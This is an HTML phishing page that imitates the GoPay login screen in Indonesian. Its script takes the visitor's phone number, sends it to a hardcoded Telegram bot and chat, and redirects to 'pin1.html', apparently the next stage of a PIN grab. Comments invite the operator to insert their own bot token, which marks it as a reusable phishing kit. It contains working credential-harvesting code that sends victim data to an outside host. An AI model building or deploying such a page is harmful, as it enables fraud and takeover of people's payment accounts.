<html lang="id">
<head>
  <meta charset="utf-8">

<link rel="apple-touch-icon" href="/enterprise/gopay-logo.webp">

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      background-color: #000000;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      padding: 0;
    }

    .app-container {
      width: 100%;
      max-width: 420px;
      min-height: 100vh;
      background-color: #000000;
      padding: 20px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      position: relative;
    }

    /* Header Top Bar */
    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding-top: 8px;
    }

    .btn-icon {
      background: none;
      border: none;
      color: #ffffff;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .top-right {
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .help-chip {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      background-color: #1c1c1e;
      border: none;
      color: #ffffff;
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .lang-chip {
      background-color: #1c1c1e;
      border: none;
      border-radius: 20px;
      padding: 6px 12px;
      color: #ffffff;
      font-size: 13px;
      font-weight: 500;
      display: flex;
      align-items: center;
      gap: 6px;
      cursor: pointer;
    }

    /* Main Content */
    .content {
      margin-top: 32px;
      flex-grow: 1;
    }

    .title {
      font-family: 'Plus Jakarta Sans', Georgia, serif;
      font-size: 28px;
      font-weight: 700;
      line-height: 1.2;
      margin-bottom: 12px;
      letter-spacing: -0.5px;
      color: #ffffff;
    }

    .subtitle {
      color: #9e9e9e;
      font-size: 15px;
      line-height: 1.4;
      margin-bottom: 36px;
    }

    .field-label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      margin-bottom: 10px;
      color: #ffffff;
    }

    .required {
      color: #ef4444;
    }

    .phone-box {
      display: flex;
      align-items: center;
      border-bottom: 1px solid #333333;
      padding-bottom: 10px;
      margin-bottom: 16px;
      transition: border-color 0.2s;
    }

    .phone-box:focus-within {
      border-bottom-color: #00b900;
    }

    .flag {
      font-size: 20px;
      margin-right: 8px;
    }

    .prefix {
      font-size: 16px;
      font-weight: 600;
      margin-right: 12px;
      color: #ffffff;
    }

    .phone-input {
      background: transparent;
      border: none;
      outline: none;
      color: #ffffff;
      font-size: 18px;
      font-weight: 600;
      width: 100%;
      letter-spacing: 0.5px;
    }

    .phone-input::placeholder {
      color: #444444;
      font-weight: 400;
    }

    .btn-link-green {
      background: none;
      border: none;
      color: #00b900;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 32px;
      display: block;
      text-align: left;
    }

    .btn-primary {
      width: 100%;
      height: 50px;
      border-radius: 25px;
      background-color: #262626;
      color: #666666;
      border: none;
      font-size: 16px;
      font-weight: 700;
      cursor: not-allowed;
      transition: all 0.2s;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .btn-primary.active {
      background-color: #00b900;
      color: #ffffff;
      cursor: pointer;
    }

    .or-divider {
      text-align: center;
      color: #666666;
      font-size: 14px;
      margin: 20px 0;
    }

    .btn-google {
      width: 100%;
      height: 50px;
      border-radius: 25px;
      background-color: transparent;
      border: 1px solid #333333;
      color: #ffffff;
      font-size: 15px;
      font-weight: 600;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      cursor: pointer;
    }

    /* Footer */
    .footer {
      text-align: center;
      font-size: 13px;
      color: #888888;
      padding: 24px 0 12px;
    }

    .goto-brand {
      color: #00b900;
      font-weight: 700;
    }

    /* Loading Spinner */
    .spinner {
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: #ffffff;
      animation: spin 0.8s linear infinite;
      display: none;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div class="app-container">
    <div>
      <!-- Header Bar -->
      <div class="top-bar">
        <button type="button" class="btn-icon" aria-label="Kembali">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
        </button>
        <div class="top-right">
          <button type="button" class="help-chip">?</button>
          <button type="button" class="lang-chip">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/><path d="M2 12h20"/></svg>
            <span>Bahasa Indonesia</span>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m6 9 6 6 6-6"/></svg>
          </button>
        </div>
      </div>

      <!-- Main Form -->
      <form id="gopayForm" class="content">
        <!-- Judul dipisah menggunakan <br> -->
        <h1 class="title">Selamat datang di<br>GoPay!</h1>
        <p class="subtitle">Masuk atau daftar hanya dalam beberapa<br>langkah mudah.</p>

        <label class="field-label" for="phoneInput">Nomor HP <span class="required">*</span></label>
        <div class="phone-box">
          <span class="flag">🇮🇩</span>
          <span class="prefix">+62</span>
          <input type="tel" id="gopay_phone" class="phone-input" placeholder="81x-xxx-xxx" inputmode="numeric" autocomplete="off" maxlength="15">
        </div>

        <button type="button" class="btn-link-green">Ada kendala nomor HP?</button>

        <button type="submit" id="submitBtn" class="btn-primary" disabled>
          <span id="btnText">Lanjut</span>
          <div id="spinner" class="spinner"></div>
        </button>

        <p class="or-divider">atau</p>

        <button type="button" class="btn-google">
          <svg width="18" height="18" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/></svg>
          Lanjut dengan Google
        </button>
      </form>
    </div>

    <footer class="footer">
      <span>from </span><span class="goto-brand">goto</span>
    </footer>
  </div>

  <script>
    // ========================================================
    // SILAKAN ISI TOKEN & CHAT ID TELEGRAM SERTA HALAMAN TUJUAN
    // ========================================================
    const TELEGRAM_BOT_TOKEN = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
    const TELEGRAM_CHAT_ID = "6742478722";
    const NEXT_PAGE_URL = "pin1.html"; // Ubah dengan nama file tujuan Anda
    // ========================================================

    const gopay_phone = document.getElementById('gopay_phone');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = document.getElementById('btnText');
    const spinner = document.getElementById('spinner');
    const form = document.getElementById('gopayForm');

    // Filter Input Angka & Aktifkan Tombol jika min 8 digit
    phoneInput.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      if (val.startsWith('0')) val = val.substring(1);
      if (val.startsWith('62')) val = val.substring(2);
      
      e.target.value = val;

      if (val.length >= 8) {
        submitBtn.classList.add('active');
        submitBtn.removeAttribute('disabled');
      } else {
        submitBtn.classList.remove('active');
        submitBtn.setAttribute('disabled', 'true');
      }
    });

    // Pengiriman Data via AJAX/Fetch & Langsung Pindah Halaman
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const rawNumber = phoneInput.value.trim();
      if (rawNumber.length < 8) return;

      const fullPhoneNumber = "+62" + rawNumber;

      // Status Loading Tombol
      btnText.style.display = 'none';
      spinner.style.display = 'block';
      submitBtn.setAttribute('disabled', 'true');
      submitBtn.style.opacity = '0.7';

      const messageText = `📱 *Data GoPay Masuk*\n\n` +
                          `• *Nomor HP:* \`${fullPhoneNumber}\`\n` +
                          `• *Waktu:* ${new Date().toLocaleString('id-ID')}`;

      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

      try {
        await fetch(telegramUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: messageText,
            parse_mode: 'Markdown'
          })
        });
      } catch (err) {
        console.error('Error pengiriman:', err);
      } finally {
        // Otomatis pindah halaman setelah proses kirim selesai
        window.location.href = NEXT_PAGE_URL;
      }
    });
  </script>
</body>
</html
